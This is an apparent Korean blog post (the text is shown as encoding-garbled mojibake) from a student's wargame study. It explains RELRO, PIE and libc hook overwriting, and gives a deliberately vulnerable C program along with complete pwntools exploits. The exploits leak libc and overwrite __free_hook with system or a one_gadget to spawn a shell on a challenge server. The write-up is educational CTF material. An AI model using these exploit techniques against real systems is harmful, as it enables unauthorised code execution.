---
title:  "TIL: PIE, RELRO, Hook Overwrite ğŸª"
excerpt: "2022.08.04 TIL âœ"
toc: true
toc_sticky: true

categories:
  - TIL
  - Hacking
---

## RELRO

**RELRO(RELocation Read-Only)**ëŠ” write ê¶Œí•œì´ ë¶ˆí•„ìš”í•œ data segmentì˜ **write ê¶Œí•œì„ ì œê±°**í•˜ëŠ” ë³´í˜¸ ê¸°ë²•ì„ ë§í•œë‹¤. Partial RELROì™€ Full RELRO ë‘ ê°€ì§€ë¡œ ë‚˜ë‰œë‹¤.

### Partial RELRO

`.init_array`, `.fini_array`ì™€ ê°™ì€ processì˜ ì‹œì‘ê³¼ ì¢…ë£Œì— ì‹¤í–‰í•  functionë“¤ì˜ addressë¥¼ ì €ì¥í•˜ê³  ìˆëŠ” sectionë“¤ì˜ write ê¶Œí•œì„ ì œê±°í•œë‹¤.

### Full RELRO

**gotì˜ write ê¶Œí•œì´ ì œê±°**ë˜ì–´ ìˆìœ¼ë©°, **dataì™€ bss sectionì—ë§Œ write ê¶Œí•œì´ ì¡´ì¬**í•œë‹¤. (**Lazy bindingì„ í•˜ì§€ ì•Šê³ **, loading ì‹œì ì— ëª¨ë“  bindingì´ ì¼ì–´ë‚œë‹¤.)

gccëŠ” ê¸°ë³¸ì ìœ¼ë¡œ Full RELROë¥¼ ì ìš©í•˜ê³ , PIEë¥¼ í•´ì œí•˜ë©´ Partial RELROë¥¼ ì ìš©í•œë‹¤.

### Bypassing RELRO

**Partial RELRO**ì˜ ê²½ìš° `.init_array`, `.fini_array` ë‘ ì˜ì—­ì„ overwriteí•˜ëŠ” ê³µê²©ì€ ìˆ˜í–‰í•˜ê¸° ì–´ë µì§€ë§Œ, **GOT overwrite**ì„ ì—¬ì „íˆ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.

**Full RELRO**ì˜ ê²½ìš° GOT overwriteì´ ë¶ˆê°€ëŠ¥í•˜ë¯€ë¡œ libraryì— ìœ„ì¹˜í•œ hookì´ë¼ëŠ” functionì˜ pointerë¥¼ ë®ì–´ ì”Œìš°ëŠ” ê³µê²© ë°©ì‹ì„ ì‚¬ìš©í•œë‹¤. (**Hook overwrite**) 

## PIE

**PIE(Position-Independent Executable)**ì€ **ASLRì´ ì½”ë“œ ì˜ì—­ì—ë„ ì ìš©**ë˜ë„ë¡ í•´ì£¼ëŠ” ê¸°ìˆ ì´ë‹¤. gccëŠ” PIEë¥¼ ê¸°ë³¸ì ìœ¼ë¡œ ì ìš©í•œë‹¤.

### Bypassing PIE - Code base êµ¬í•˜ê¸°

ASLR í™˜ê²½ì—ì„œ PIEê°€ ì ìš©ëœ binaryëŠ” ì‹¤í–‰ë  ë•Œë§ˆë‹¤ ë‹¤ë¥¸ addressì— ì ì¬ëœë‹¤. ë”°ë¼ì„œ **PIE base, or code base**ë¼ê³  ë¶ˆë¦¬ëŠ” binaryì˜ ì£¼ì†Œë¥¼ ì•Œì•„ë‚´ì–´ì•¼ í•œë‹¤.

ROPë¥¼ ë‹¤ë£¨ëŠ” stageì—ì„œ libraryì˜ base ì£¼ì†Œë¥¼ êµ¬í•  ë•Œì²˜ëŸ¼ code section ë‚´ì˜ ì„ì˜ì˜ addressë¥¼ ì½ê³ , ì´ ì£¼ì†Œì—ì„œ offsetì„ ë¹¼ì–´ baseë¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.

### Bypassing PIE - Partial Overwrite

ASLRì˜ íŠ¹ì„± ìƒ code sectionì˜ ì£¼ì†Œë„ **í•˜ìœ„ 12 bit ê°’ì€ í•­ìƒ ê°™ìœ¼ë¯€ë¡œ**, ì‚¬ìš©í•˜ë ¤ëŠ” code gadgetì˜ addressê°€ return addressì™€ **í•˜ìœ„ í•œ byteë§Œ ë‹¤ë¥´ë‹¤ë©´** ì´ ê°’ë§Œì„ overwriteí•˜ì—¬ ì›í•˜ëŠ” codeë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤.

ë§Œì•½ ë‘ byte ì´ìƒì´ ë‹¤ë¥¸ addressë¡œ control flowë¥¼ ì˜®ê¸°ê³ ì í•œë‹¤ë©´ brute forcingì´ í•„ìš”í•˜ë©°, ê³µê²©ì´ ë°˜ë“œì‹œ ì„±ê³µí•˜ì§€ ì•Šì„ ìˆ˜ ìˆë‹¤.

## Hook

**Hooking**ì€ OSê°€ ì–´ë–¤ codeë¥¼ ì‹¤í–‰í•˜ë ¤ í•  ë•Œ ì´ë¥¼ **ë‚šì•„ì±„ì–´ ë‹¤ë¥¸ codeë¥¼ ì‹¤í–‰**í•˜ê²Œ í•˜ëŠ” ê²ƒì„ ë§í•˜ê³ , ì´ë•Œ ì‹¤í–‰ë˜ëŠ” codeë¥¼ **hook**ì´ë¼ê³  ë¶€ë¥¸ë‹¤.

### `malloc`, `free`, `realloc`ì˜ hook

`libc.so`ì— êµ¬í˜„ë˜ì–´ ìˆëŠ” `malloc`, `free`, `realloc`ì€ ë””ë²„ê¹… í¸ì˜ë¥¼ ìœ„í•œ hook ë³€ìˆ˜ê°€ ì •ì˜ë˜ì–´ ìˆë‹¤.

```c
// __malloc_hook
void *__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;
  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook); // malloc hook read
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0)); // call hook
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  checked_request2size (bytes, tbytes);
  size_t tc_idx = csize2tidx (tbytes);
  // ...
}
```

`malloc`ì€ `__malloc_hook`ì´ NULLì´ ì•„ë‹ˆë¼ë©´ `malloc`ì„ ìˆ˜í–‰í•˜ê¸° ì „ì— `__malloc_hook`**ì´ pointí•˜ëŠ” í•¨ìˆ˜ë¥¼ ì‹¤í–‰**í•œë‹¤. ì´ë•Œ `malloc`**ì˜ argumentëŠ” hook í•¨ìˆ˜ì— ì „ë‹¬**ëœë‹¤. 

`free`, `realloc`ë„ ê°™ì€ ë°©ì‹ìœ¼ë¡œ `__free_hook`, `__realloc_hook`ì´ë¼ëŠ” hook ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•œë‹¤.

`__malloc_hook`, `__free_hook`, `__realloc_hook`ì€ ë§ˆì°¬ê°€ì§€ë¡œ `libc.so`ì— ì •ì˜ë˜ì–´ ìˆê³ , ì´ë“¤ì€ `bss` **sectionì— í¬í•¨**ëœë‹¤. â†’ `bss` **sectionì€ writeì´ ê°€ëŠ¥í•˜ë¯€ë¡œ hookì˜ ê°’ì„ ì¡°ì‘í•  ìˆ˜ ìˆë‹¤.**

## Hook overwrite

`__malloc_hook`ì„ `system`ì˜ ì£¼ì†Œë¡œ ë®ê³ , `malloc("/bin/sh")`**ì„ ìˆ˜í–‰**í•˜ë©´ shellì„ íšë“í•  ìˆ˜ ìˆë‹¤. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;
  
	setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitrary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```

### Vulnerability scanning

- `checksec`
    
    <p align="center">
		<a href="/assets/images/TIL220804/Untitled (2).png">
		<img src="/assets/images/TIL220804/Untitled (2).png" width="600">
    	</a>
	</p>
    
- [1] Stack buffer overflow íŒŒíŠ¸ì—ì„œ **stack buffer overflow**ê°€ ë°œìƒí•œë‹¤. Stack buffer overflowê°€ **í•œ ë²ˆë§Œ ë°œìƒ**í•˜ê¸° ë•Œë¬¸ì— stackì„ overwriteí•  ìˆ˜ëŠ” ì—†ì§€ë§Œ, **íŠ¹ì • ê°’ì„ ì½ì–´ë‚´ëŠ” ë°ì—ëŠ” ì‚¬ìš©**í•  ìˆ˜ ìˆë‹¤.
- [2] Arbitrary-Address-Write íŒŒíŠ¸ë¥¼ ì´ìš©í•´ **ì›í•˜ëŠ” ì£¼ì†Œì— ì›í•˜ëŠ” ê°’ì„ ì“¸ ìˆ˜ ìˆë‹¤**.
- [3] Arbitrary-Address-Free íŒŒíŠ¸ë¥¼ ì´ìš©í•´ ì›í•˜ëŠ” ì£¼ì†Œì˜ memoryë¥¼ freeí•  ìˆ˜ ìˆë‹¤.

### Libraryì˜ ë³€ìˆ˜, í•¨ìˆ˜ë“¤ì˜ ì£¼ì†Œ êµ¬í•˜ê¸°

Stackì—ëŠ” `main`ì˜ return addressì¸ `__libc_start_main`ì˜ ì£¼ì†Œê°€ ì í˜€ ìˆë‹¤. ì´ í•¨ìˆ˜ëŠ” `libc.so`ì— ì •ì˜ë˜ì–´ ìˆìœ¼ë¯€ë¡œ ì´ ì£¼ì†Œë¥¼ ì´ìš©í•´ `__free_hook`, `system`, `"/bin/sh"`ì˜ ì£¼ì†Œë¥¼ ì–»ì„ ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.

```python
from pwn import *

p = process("./fho")
e = ELF("./fho")
libc = ELF("./libc-2.27.so")

# [1] Leak libc base
buf = b"A"*0x48
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
libc_base = u64(p.recvline()[:-1].ljust(8, b"\x00")) - (libc.symbols["__libc_start_main"] + 231)
system = libc.symbols["system"] + libc_base
free_hook = libc.symbols["__free_hook"] + libc_base
binsh = next(libc.search(b"/bin/sh"))
```

- Stackì— ìˆëŠ” `main`ì˜ **return address ì§ì „ê¹Œì§€**ì˜ ë¶€ë¶„ì„ dummy dataë¡œ ì±„ì›Œ bufferê°€ ì¶œë ¥ë  ë•Œ **return addressë„ í•¨ê»˜ ì¶œë ¥**ë˜ë„ë¡ í•œë‹¤. gdbë¥¼ ì´ìš©í•´ ì´ 0x48 byteì˜ dummy dataë¥¼ ì…ë ¥í•˜ë©´ ë¨ì„ ì•Œ ìˆ˜ ìˆë‹¤.
- gdbë¥¼ ì´ìš©í•˜ë©´ `main`ì˜ return addressëŠ” `__libc_start_main + 231`ì„ì„ ì•Œ ìˆ˜ ìˆë‹¤.
    
    <p align="center">
		<a href="/assets/images/TIL220804/Untitled (1).png">
			<img src="/assets/images/TIL220804/Untitled (1).png" width="600">
		</a>
	</p>
    
    ë”°ë¼ì„œ ì–»ì–´ë‚¸ **return addressì—ì„œ libc ìƒì˜** `__libc_start_main + 231`**ì„ ë¹¼ë©´ offsetì„ ì–»ì–´ë‚¼ ìˆ˜ ìˆë‹¤**. â†’ `system`, `__free_hook`ì˜ ì£¼ì†Œ ê³„ì‚° ê°€ëŠ¥
    
- `"/bin/sh"` ì—­ì‹œ `libc`ì—ì„œ `search()`ë¥¼ ì´ìš©í•´ ì°¾ì•„ë‚¼ ìˆ˜ ìˆë‹¤.

### Exploit

```python
from pwn import *

p = remote("host3.dreamhack.games", 18827)
e = ELF("./fho")
libc = ELF("./libc-2.27.so")

# [1] Leak libc base
buf = b"A"*0x48
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
libc_base = u64(p.recvline()[:-1].ljust(8, b"\x00")) - (libc.symbols["__libc_start_main"] + 231)
system = libc.symbols["system"] + libc_base
free_hook = libc.symbols["__free_hook"] + libc_base
binsh = next(libc.search(b"/bin/sh"))

# [2] Overwrite 'free_hook' with 'system'
p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(system))

# [3] Exploit
p.recvuntil("To free: ")
p.sendline(str(binsh))

p.interactive()
```

### one_gadget

**one_gadget**ì€ ì‹¤í–‰í•˜ë©´ shellì´ íšë“ë˜ëŠ” ë¯¸ë¦¬ ì‘ì„±ëœ shell codeë¥¼ ë§í•œë‹¤. `one_gadget`ì´ë¼ëŠ” ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ë©´ `libc`**ì—ì„œ ì‰½ê²Œ one_gadgetì„ ì°¾ì„ ìˆ˜ ìˆë‹¤**. (*[https://github.com/david942j/one_gadget](https://github.com/david942j/one_gadget)*)

<p align="center">
	<a href="/assets/images/TIL220804/Untitled.png">
		<img src="/assets/images/TIL220804/Untitled.png" width="600">
    </a>
</p>

ì´ one_gadgetì„ í™œìš©í•˜ì—¬ `__free_hook`**ì„ one_gadgetìœ¼ë¡œ overwrite**í•¨ìœ¼ë¡œì¨ `free`**ê°€ ì‹¤í–‰ë˜ë©´ ë°”ë¡œ shellì„ ì‹¤í–‰**í•˜ë„ë¡ exploití•  ìˆ˜ë„ ìˆë‹¤

ì´ ë°©ì‹ì€ `malloc`, `free` ë“±ì˜ í•¨ìˆ˜ë“¤ì˜ argumentì˜ ê¸¸ì´ê°€ ì œí•œë˜ì–´ ìˆëŠ” ë“±ì˜ ì œì•½ ì‚¬í•­ìœ¼ë¡œ ì¸í•´ **argumentë¡œ** `"/bin/sh"`**ë¥¼ ë„£ê¸° í˜ë“¤ ë•Œ** ìœ ìš©í•˜ë‹¤.

```python
from pwn import *

p = remote("host3.dreamhack.games", 18827)
e = ELF("./fho")
libc = ELF("./libc-2.27.so")

# [1] Leak libc base
buf = b"A"*0x48
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
libc_base = u64(p.recvline()[:-1].ljust(8, b"\x00")) - (libc.symbols["__libc_start_main"] + 231)
system = libc.symbols["system"] + libc_base
free_hook = libc.symbols["__free_hook"] + libc_base
og = libc_base + 0x4f432

# [2] Overwrite 'free_hook' with 'system'
p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(og))

# [3] Exploit
p.recvuntil("To free: ")
p.sendline(str(12345)) # doesn't matter

p.interactive()
```

## ë²ˆì™¸: ì¶”ê°€ë¡œ ì•Œê²Œ ëœ ì‚¬ì‹¤ë“¤

### `free_hook`, `og`ë¥¼ `str()`ë¡œ ê°ì‹¸ sendí•˜ëŠ” ì´ìœ 

`scanf('%d', &addr)`ê³¼ ê°™ì´ ì‚¬ìš©ìë¡œë¶€í„° **ìˆ«ìë¥¼ ì…ë ¥ë°›ëŠ”** ì½”ë“œëŠ” ì‚¬ìš©ìê°€ **1234ë¥¼ ì…ë ¥í•˜ë©´ ê·¸ëŒ€ë¡œ ë©”ëª¨ë¦¬ì— 1234ê°€ ì €ì¥**ëœë‹¤. ì´ëŠ” ë¬¸ì œì˜ `scanf("%llu", &addr);`ë„ ë§ˆì°¬ê°€ì§€ì´ë‹¤. 

â‡’ ë”°ë¡œ ê°’ì„ byte í˜•íƒœë¡œ ì¹˜í™˜í•  í•„ìš” ì—†ì´, stringìœ¼ë¡œë§Œ ì „í™˜í•´ì„œ sendí•˜ë©´ ëœë‹¤. (`send`ëŠ” stringì„ argumentë¡œ ë°›ëŠ”ë‹¤.)

ë°˜ë©´, `read`, `gets`, `scanf(%s)`ì™€ ê°™ì´ **ë¬¸ìì—´ì„ ì…ë ¥ ë°›ëŠ” ì½”ë“œ**ëŠ” ì‚¬ìš©ìê°€ 1234ë¥¼ ì…ë ¥í•˜ë©´ **0x31 0x32 0x33 0x34ê°€ ì…ë ¥**ëœë‹¤.

â‡’ `p64()`ì™€ ê°™ì€ í•¨ìˆ˜ë¡œ **ê°’ì„ byteë¡œ ë³€í™˜í•˜ê³ , packingí•´ì•¼** ì˜¬ë°”ë¥¸ ê°’ì„ sendí•  ìˆ˜ ìˆë‹¤.

### ë¼ì´ë¸ŒëŸ¬ë¦¬ ì£¼ì†Œ

ë¼ì´ë¸ŒëŸ¬ë¦¬ ì£¼ì†ŒëŠ” **0x00007fXXXXXXXOOO** í˜•ì‹ì„ ê°–ëŠ”ë‹¤. **í•˜ìœ„ 12 bitê°€ ë™ì¼**í•˜ê³ , **ìƒìœ„ 24 bitê°€ ë™ì¼**í•˜ë‹¤.

**Little-endian**ì— ì˜í•´ memoryì—ì„œ ê°’ì´ ì¶œë ¥ë  ë•ŒëŠ” **ë°˜ì „ëœ ìƒíƒœë¡œ ë‚˜ì™€ í•˜ìœ„ 24 bit**ê°€ ë™ì¼í•˜ê³ , **ìƒìœ„ 12 bit**ê°€ ë™ì¼í•˜ê²Œ ëœë‹¤. 

ë”°ë¼ì„œ exploit codeì—ì„œ return addressë¥¼ êµ¬í•˜ëŠ” ê³¼ì •ì„ ìì„¸íˆ ì‚´í´ë³´ìë©´, 

1. `p.recvline()[:-1]` â†’ ì¶œë ¥ëœ ê°’ì—ì„œ `\n`**ì„ ì œê±°**í•œë‹¤.
2. `p.recvline()[:-1].ljust(8, b"\x00")` â†’ addressì˜ ë§¨ ì•ì— ìˆëŠ” (**ì¶œë ¥ëœ ìƒíƒœì—ì„  ë§¨ ë’¤ì— ìˆëŠ”**) 0x00ì„ **ë’¤ìª½ì—** ë¶™ì—¬ì£¼ì–´ addressê°€ **ì´ 8 byteê°€ ë˜ë„ë¡** í•œë‹¤.
3. `u64(p.recvline()[:-1].ljust(8, bâ€\x00â€))` â†’ ì¶œë ¥ëœ ê°’ì„ **unpack**í•œë‹¤. return addressëŠ” ì½”ë“œì—ì„œ `printf("%s")` ê¼´ë¡œ ì¶œë ¥ë˜ëŠ”ë°, **stringì€ memoryì— ì €ì¥ëœ ìˆœì„œ ê·¸ëŒ€ë¡œ ì¶œë ¥ë˜ë¯€ë¡œ unpackì´ í•„ìš”**í•˜ë‹¤.